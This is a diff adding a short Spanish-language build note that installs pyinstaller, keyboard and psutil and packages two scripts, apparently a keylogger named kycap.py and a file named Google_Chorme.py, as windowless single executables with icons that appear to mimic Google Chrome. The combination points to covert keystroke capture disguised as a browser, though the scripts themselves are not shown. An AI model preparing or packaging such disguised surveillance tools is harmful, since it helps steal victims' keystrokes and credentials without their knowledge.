@@ -1,0 +1,16 @@
+instala pyinstaller
+-----------------------------------------------------------
+
+pip install pyinstaller
+
+pip install keyboard
+
+pip install psutil
+
+-----------------------------------------------------------
+usa estos comandos para empaquetar los scripts
+-----------------------------------------------------------
+
+pyinstaller --onefile --noconsole --icon=engra.ico kycap.py
+
+pyinstaller --onefile --noconsole --icon=chorme.ico Google_Chorme.py
